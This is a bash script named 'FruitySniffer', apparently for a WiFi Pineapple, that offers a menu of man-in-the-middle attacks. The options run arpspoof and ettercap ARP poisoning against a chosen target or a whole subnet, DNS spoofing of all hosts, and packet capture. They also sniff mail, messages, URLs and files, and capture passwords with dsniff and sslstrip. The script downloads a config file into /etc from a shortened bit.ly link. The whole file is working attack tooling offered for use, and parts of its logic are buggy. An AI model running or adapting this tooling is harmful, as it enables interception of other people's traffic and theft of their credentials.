#!/bin/bash

# Script made by JesseIZ aka Jesse Izeboud
function finish {
  #  cleanup code 
clear

ps -ef | grep "arpspoof" | awk '{print $2}' | xargs kill |clear |echo "Exiting arpspoof"
	ps -ef | grep "mdk3" | awk '{print $2}' | xargs kill | clear |echo "Exiting mdk3"
		ps -ef | grep "ettercap" | awk '{print $2}' | xargs kill | clear |echo "Exiting ettercap"
 			ps -ef | grep "dsniff" | awk '{print $2}' | xargs kill | clear |echo "Exiting dsniff"
				 ps -ef | grep "urlsnarf" | awk '{print $2}' | xargs kill |clear|echo "Exiting urlsnarf"
					 ps -ef | grep "filesnarf" | awk '{print $2}' | xargs kill |clear|echo "Exiting filesnarf"
						 ps -ef | grep "mailsnarf" | awk '{print $2}' | xargs kill |clear|echo "Exiting mailsnarf"
							ps -ef | grep "tcpdump" | awk '{print $2}' | xargs kill	|clear|	echo "Exiting tcpdump"
								 ps -ef | grep "msgsnarf" | awk '{print $2}' | xargs kill |clear|echo "Exiting msgsnarf "
									 ps -ef | grep "sslstrip" | awk '{print $2}' | xargs kill |clear|echo "Exiting sslstrip "

echo "Done!"

sleep 1
clear




}	
trap finish EXIT


while [ answer != "0" ] 
do 
echo 1 > /proc/sys/net/ipv4/ip_forward
clear
 
clear


                          

echo "#########################################################################################################################"
echo "## _______  _______          __________________          _______  _       _________ _______  _______  _______  _______ ##"
echo "##(  ____ \(  ____ )|\     /|\__   __/\__   __/|\     /|(  ____ \( (    /|\__   __/(  ____ \(  ____ \(  ____ \(  ____ )##"
echo "##| (    \/| (    )|| )   ( |   ) (      ) (   ( \   / )| (    \/|  \  ( |   ) (   | (    \/| (    \/| (    \/| (    )|##"
echo "##| (__    | (____)|| |   | |   | |      | |    \ (_) / | (_____ |   \ | |   | |   | (__    | (__    | (__    | (____)|##"
echo "##|  __)   |     __)| |   | |   | |      | |     \   /  (_____  )| (\ \) |   | |   |  __)   |  __)   |  __)   |     __)##"
echo "##| (      | (\ (   | |   | |   | |      | |      ) (         ) || | \   |   | |   | (      | (      | (      | (\ (   ##"
echo "##| )      | ) \ \__| (___) |___) (___   | |      | |   /\____) || )  \  |___) (___| )      | )      | (____/\| ) \ \__##"
echo "##|/       |/   \__/(_______)\_______/   )_(      \_/   \_______)|/    )_)\_______/|/       |/       (_______/|/   \__/##"
echo "#########################################################################################################################"                                       
echo "Version : Alpha v1.0 "
echo
echo
echo "Select from the following functions"
echo
echo "Hit ctrl + c at any time to quit and clean up"
echo "  0    Clean up manually "
echo "  1    Sniff  Mails ,Messages,and URl's and files"
echo "  2    DNS Spoof, Capture All Packets"
echo "  3    Sniffing with Ettercap"
echo "  4    Install Dependencies" 
echo "  5    Sniffing passwords over HTTPS(SSL) + HTTP FTP, IMAP , SMTP and more "
echo "  6    Exit "

read -p "choice : " answer
    case $answer in
       0)break 

;;
       1)clear
echo
echo
echo
echo "#########################################################################################################################"
echo "## _______  _______          __________________          _______  _       _________ _______  _______  _______  _______ ##"
echo "##(  ____ \(  ____ )|\     /|\__   __/\__   __/|\     /|(  ____ \( (    /|\__   __/(  ____ \(  ____ \(  ____ \(  ____ )##"
echo "##| (    \/| (    )|| )   ( |   ) (      ) (   ( \   / )| (    \/|  \  ( |   ) (   | (    \/| (    \/| (    \/| (    )|##"
echo "##| (__    | (____)|| |   | |   | |      | |    \ (_) / | (_____ |   \ | |   | |   | (__    | (__    | (__    | (____)|##"
echo "##|  __)   |     __)| |   | |   | |      | |     \   /  (_____  )| (\ \) |   | |   |  __)   |  __)   |  __)   |     __)##"
echo "##| (      | (\ (   | |   | |   | |      | |      ) (         ) || | \   |   | |   | (      | (      | (      | (\ (   ##"
echo "##| )      | ) \ \__| (___) |___) (___   | |      | |   /\____) || )  \  |___) (___| )      | )      | (____/\| ) \ \__##"
echo "##|/       |/   \__/(_______)\_______/   )_(      \_/   \_______)|/    )_)\_______/|/       |/       (_______/|/   \__/##"
echo "#########################################################################################################################"           $
echo "Version : Alpha v1.0 "
echo
echo "Sniff  Mails ,Messages,and URl's or start arpspoofing" 
echo
ettercap -I 
echo "Which interface do you want to use? Default = br-lan"
read Interface
echo "Start Arpspoofing(y/n) only use this if connected in client mode!" 
read answer
if [[ $answer == "y"  ]]; then
echo "Starting arpspoof"
route -n -A inet | grep UG
echo "What is your gateway? Should be listed above "
read gateway
nmap -sP "$gateway/24" 
echo "Who do you want to arpspoof eg : 192.168.0.18"
read target
 arpspoof -i $Interface -r $gateway -t $target &

else  
   echo "press ENTER to continue"
   read key


fi


echo "Where do your want to save the output? Default = /sd/FruitySniffer/logs/logs.txt" 
read Location

if [[ $Location == '' ]]; then  
 
Location=/sd/FruitySniffer/logs/logs.txt #i.e. /sd for sd / for root .


fi 

if [[ $Interface == '' ]]; then 
Interface=br-lan #i.e. wlan0 for wifi, ppp0 for 3g modem/dialup, eth0 for lan

(mailsnarf -i $Interface >> $Location &) && (msgsnarf -i  $Interface >> $Location &) && (urlsnarf -i $Interface  >> $Location &) && (filesnarf -i $Interface >> $Location)

else

(mailsnarf -i $Interface >> $Location &) && (msgsnarf -i  $Interface >> $Location &) && (urlsnarf -i $Interface  >> $Location &) && (filesnarf -i $Interface >> $Location) && (echo "press ENTER to menu") && (read key)
   


fi

       ;;
       2)
echo
echo 
echo
echo "#########################################################################################################################"
echo "## _______  _______          __________________          _______  _       _________ _______  _______  _______  _______ ##"
echo "##(  ____ \(  ____ )|\     /|\__   __/\__   __/|\     /|(  ____ \( (    /|\__   __/(  ____ \(  ____ \(  ____ \(  ____ )##"
echo "##| (    \/| (    )|| )   ( |   ) (      ) (   ( \   / )| (    \/|  \  ( |   ) (   | (    \/| (    \/| (    \/| (    )|##"
echo "##| (__    | (____)|| |   | |   | |      | |    \ (_) / | (_____ |   \ | |   | |   | (__    | (__    | (__    | (____)|##"
echo "##|  __)   |     __)| |   | |   | |      | |     \   /  (_____  )| (\ \) |   | |   |  __)   |  __)   |  __)   |     __)##"
echo "##| (      | (\ (   | |   | |   | |      | |      ) (         ) || | \   |   | |   | (      | (      | (      | (\ (   ##"
echo "##| )      | ) \ \__| (___) |___) (___   | |      | |   /\____) || )  \  |___) (___| )      | )      | (____/\| ) \ \__##"
echo "##|/       |/   \__/(_______)\_______/   )_(      \_/   \_______)|/    )_)\_______/|/       |/       (_______/|/   \__/##"
echo "#########################################################################################################################"           $
echo "Version : Alpha v1.0 "
echo
echo "DNS Spoof and Capture packets"
echo
echo
echo " Do you want to setup DNS Spoof? (y/n) "
read yesorno
if [[ $yesorno == '' ]]; then
echo "thats not an option"

fi 
if [[ $yesorno == 'y' ]]; then 

echo "starting DNS Spoof setup"
echo "."
echo ".."
echo "..."
sleep 1
echo "setup hostfile (spoof all hosts by typing : 172.16.42.1 * )!"
sleep 2
touch /etc/pineapple/spoofhost.txt
nano /etc/pineapple/spoofhost.txt
echo "hostfile setup complete"
sleep 1
ettercap -I
echo "choose your interface that's connected to the internet (Default = br-lan)"
read Interface2
echo "You choosed $Interface2"
echo

if [[ $Interface2 == '' ]]; then
Interface=br-lan 

fi
(dnsspoof -i $Interface2 -f /etc/pineapple/spoofhost &) && (echo "dnsspoof is running " & )
fi
echo
echo
echo
echo
echo
echo "Do you want to capture all trafic ? SD CARD/USB Saving only!! (y/n)"
read yesorno2
if [[ $yesorno2 == ''  ]]; then
echo "that's not an option"
echo "Do you want to capture all trafic ? SD CARD/USB Saving only!! (y/n)"
read yesorno2  
fi
if [[ $yesorno2 == 'y' ]]; then
[ -d "/sd"  ] && echo " SD Card Found!" || echo "No SD Card Found!"
[ -d "/usb"  ] && echo "Usb Found!" || echo "No USB found!"
sleep 1
echo "do you want to save the capture on /sd or /usb?"
read SDorUSB
if [[ $SDorUSB == ''  ]]; then
echo "that's not an option"
echo "do you want to save the capture on /sd or /usb?"
read SDorUSB
fi
if [[ $SDorUSB == '/sd'  ]]; then
mkdir /sd/FruitySniffer/
mkdir /sd/FruitySniffer/logs
mkdir /sd/FruitySniffer/logs/tcpdump/
touch /sd/FruitySniffer/logs/tcpdump/logs*.txt
SDorUSB=/sd/FruitySniffer/logs/tcpdump/logs*.txt
echo "Log file saved in $SDorUSB"
sleep 3
fi
if [[ $SDorUSB == '/usb'  ]]; then
mkdir /usb/FruitySniffer/
mkdir /usb/FruitySniffer/logs
mkdir /usb/FruitySniffer/logs/tcpdump/
touch /usb/FruitySniffer/logs/tcpdump/logs*txt
SDorUSB=/usb/FruitySniffer/logs/tcpdump/logs*txt
echo "log file saved in $SDorUSB"

fi
echo "Starting tcpdump hit ctrl + c to exit"
sleep 1
echo "."
echo ".."
echo "..."
tcpdump -w $SDorUSB
fi
       ;;
       3)
clear
echo
echo
echo
echo "#########################################################################################################################"
echo "## _______  _______          __________________          _______  _       _________ _______  _______  _______  _______ ##"
echo "##(  ____ \(  ____ )|\     /|\__   __/\__   __/|\     /|(  ____ \( (    /|\__   __/(  ____ \(  ____ \(  ____ \(  ____ )##"
echo "##| (    \/| (    )|| )   ( |   ) (      ) (   ( \   / )| (    \/|  \  ( |   ) (   | (    \/| (    \/| (    \/| (    )|##"
echo "##| (__    | (____)|| |   | |   | |      | |    \ (_) / | (_____ |   \ | |   | |   | (__    | (__    | (__    | (____)|##"
echo "##|  __)   |     __)| |   | |   | |      | |     \   /  (_____  )| (\ \) |   | |   |  __)   |  __)   |  __)   |     __)##"
echo "##| (      | (\ (   | |   | |   | |      | |      ) (         ) || | \   |   | |   | (      | (      | (      | (\ (   ##"
echo "##| )      | ) \ \__| (___) |___) (___   | |      | |   /\____) || )  \  |___) (___| )      | )      | (____/\| ) \ \__##"
echo "##|/       |/   \__/(_______)\_______/   )_(      \_/   \_______)|/    )_)\_______/|/       |/       (_______/|/   \__/##"
echo "#########################################################################################################################"           $
echo "Version : Alpha v1.0 "
echo
echo
echo
echo
echo "Ettercap"
echo 
echo 
echo
echo "Downloading config file"
wget  http://bit.ly/1iQbYYX -P /etc/ -q 
echo "Installed the right config file"
sleep 1
echo "Do you want to sniff on the entire subnet (y/n) ? (Not Stealthy!)"
read yesorno3

if [[ $yesorno3 == 'y'  ]]; then
echo " Sniffing in silent mode  (y/n) ?(if not it's gonna Spam your terminal!!)?"
read yesorno4
if [[ $yesorno4 == 'y'  ]]; then
ettercap -I
echo "what is your interface connected to the internet? Default = br-lan"
read Interface14
if [[ $Interface14 == ''  ]]; then
Interface14=br-lan 
fi
echo "Starting Sniffing on entire subnet"
echo "."
echo ".."
echo "..."
(ettercap -Tq -i $Interface14 -M arp // // ) && (echo " Sniffing attack started!")
fi


if [[ $yesorno4 == ''  ]]; then
echo "That's not an option!"
fi
if  [[ $yesorno4 == 'n'  ]]; then

ettercap -I
echo "what is your interface connected to the internet? Default = br-lan"
read Interface15
if [[ $Interface15 == ''  ]]; then
Interface15=br-lan 
fi
echo "Starting Sniffing on entire subnet"
echo "."
echo ".."
echo "..."
(ettercap -T -i $Interface14 -M arp // // ) && (echo "Sniffing attack started!")



if [[ $yesorno3 == '' ]]; then echo "That's not an option" fi

if [[ $yesorno3 == 'n' ]]; then echo "Setting up ettercap sniffing " 
echo "." 
echo ".." 
echo "..." 
sleep 1 
route -n -A inet | grep UG 
echo "What is the gateway of the interface connected to the internet? Default = 172.16.42.1" 
read gateway14 
if [[ $gateway14 == '' ]]; then 
gateway14=172.16.42.1 
fi 
echo "Scan for targets? (y/n) " 
read yesorno5

if [[ $yesorno5 == 'y' ]]; then 
echo "Scanning for targets" 
sleep 1 
nmap -sP "$gateway14/24" 
fi

echo "Enter target IP : " 
read targetIP 
if [[ $targetIP == '' ]]; then 
echo "that's not an option!" 
fi 
echo " Where do you want to save the sniffed data? default = /sd/FruitySniffer/logs/MITM/ " 
read savesniff 
echo "how do you want to name your log file? default = FruitySniffer.log" 
read defaultname

if [[ $defaultname == ''  ]]; then 
defaultname=FruitySniffer.log
fi

if [[ $savesniff == ''  ]]; then
savesniff=/sd/FruitySniffer/logs/MITM/
fi


sleep 1
[ -d "$savesniff"  ] && echo "Directory exists" || echo "Directory doesn't exist! Making it! " 

mkdir $savesniff

touch "$savesniff$defaultname"



ettercap -I
echo "What is your interface? Default = br-lan"
read interface16

if [[ $interface16 == '' ]]; then
interface16=br-lan
fi

sleep 3
echo "Starting  Sniffing on Target!"
echo "."
echo ".."
echo "..."
echo "Started Sniffing on Target!"
ettercap -i $interface16 -T -q -M arp:oneway,remote -w "$savesniff$defaultname{0123456789}" /$gateway14/ /$targetIP/ 

fi











fi
fi

fi
       ;;
       4)

echo "Installing Dependencies"
opkg install ettercap
opkg install dsniff 
opkg install mdk3
opkg install sslstrip
opkg install tcpdump
echo "Done!"
;;

5)
clear
echo
echo
echo
echo "#########################################################################################################################"
echo "## _______  _______          __________________          _______  _       _________ _______  _______  _______  _______ ##"
echo "##(  ____ \(  ____ )|\     /|\__   __/\__   __/|\     /|(  ____ \( (    /|\__   __/(  ____ \(  ____ \(  ____ \(  ____ )##"
echo "##| (    \/| (    )|| )   ( |   ) (      ) (   ( \   / )| (    \/|  \  ( |   ) (   | (    \/| (    \/| (    \/| (    )|##"
echo "##| (__    | (____)|| |   | |   | |      | |    \ (_) / | (_____ |   \ | |   | |   | (__    | (__    | (__    | (____)|##"
echo "##|  __)   |     __)| |   | |   | |      | |     \   /  (_____  )| (\ \) |   | |   |  __)   |  __)   |  __)   |     __)##"
echo "##| (      | (\ (   | |   | |   | |      | |      ) (         ) || | \   |   | |   | (      | (      | (      | (\ (   ##"
echo "##| )      | ) \ \__| (___) |___) (___   | |      | |   /\____) || )  \  |___) (___| )      | )      | (____/\| ) \ \__##"
echo "##|/       |/   \__/(_______)\_______/   )_(      \_/   \_______)|/    )_)\_______/|/       |/       (_______/|/   \__/##"
echo "#########################################################################################################################"           $
echo "Version : Alpha v1.0 "
echo
echo
echo
echo "Sniffing passwords over HTTPS(SSL) + HTTP and more"
echo 
echo "Do you want to start arpspoofing? (y/n) Only use this if connected in client mode!"
read arpspoofyn
if [[ $arpspoofyn == ''  ]]; then
echo "that's not an option!"
fi
if [[ $arpspoofyn == 'y'  ]]; then
echo "Starting arpspoof setup"
sleep 1
echo "."
echo ".."
sleep 1
echo "..."
sleep 1
echo "...."
route -n -A inet | grep UG
echo "What is your gateway? Should be listed above "
read gateway111
echo "What is your interface connected to the internet? : = Default = br-lan"
read Interface1412

if [[ $Interface1412 == ''  ]]; then
Interface1412=br-lan
fi
nmap -sP "$gateway111/24" 
echo "Who do you want to arpspoof eg : 192.168.0.18"
read target11
arpspoof -i $Interface1412 -r $gateway111 -t $target11 
fi
if [[ $arpspoofyn == 'n'  ]]; then
echo
echo
echo "Where do you want to save the output? Default = /sd/FruitySniffer/logs/Passwords/"
read saveoutput

if [[ $saveoutput == ''  ]]; then
saveoutput=/sd/FruitySniffer/logs/Passwords/
mkdir /sd/FruitySniffer
mkdir /sd/FruitySniffer/logs/
mkdir /sd/FruitySniffer/logs/Passwords/ 

fi
mkdir $saveoutput
ettercap -I
echo "Choose the interface that's connected to the internet? Default = br-lan"
read iface

if [[ $iface == ''  ]]; then
iface=br-lan
fi

echo "Starting Password Sniffing"
echo "."
sleep 1
echo ".."
sleep 1 
echo "..."
sleep 1
echo "Started Password Sniffing"

dsniff -i $iface -w "$saveoutput/logs*.txt" &  
sslstrip  $iface -w "$saveoutput/sslstrip*.log" &


fi

;;

6)
clear
break;; 
	
       
	 
   esac 
   echo "Press RETURN for menu"
   read key
done
exit 0



